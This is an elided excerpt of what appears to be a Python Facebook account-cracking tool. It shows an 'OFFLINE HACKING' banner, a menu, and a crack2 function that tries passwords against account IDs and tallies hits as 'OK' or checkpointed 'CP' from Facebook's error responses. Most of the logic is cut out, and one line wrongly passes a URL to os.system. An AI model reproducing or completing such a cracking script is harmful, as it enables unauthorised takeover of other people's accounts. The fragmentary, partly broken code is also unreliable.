...
def banner():
 ...
 ____  ______ ______ _      _____ _   _ ______   _    _          _____ _  _______ _   _  _____  
  / __ \|  ____|  ____| |    |_   _| \ | |  ____| | |  | |   /\   / ____| |/ /_   _| \ | |/ ____| 
 | |  | | |__  | |__  | |      | | |  \| | |__    | |__| |  /  \ | |    | ' /  | | |  \| | |  __  
 | |  | |  __| |  __| | |      | | | . ` |  __|   |  __  | / /\ \| |    |  <   | | | . ` | | |_ | 
 | |__| | |    | |    | |____ _| |_| |\  | |____  | |  | |/ ____ \ |____| . \ _| |_| |\  | |__| | 
  \____/|_|    |_|    |______|_____|_| \_|______| |_|  |_/_/    \_\_____|_|\_\_____|_| \_|\_____|  \0.33                          
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("https://youtube.com/channel/UCMwVbl52U3fGjWNstqbymAA")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [PLAY BOY] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [PLAY BOY-CP] %s|%s        '%(b,idf,pw))
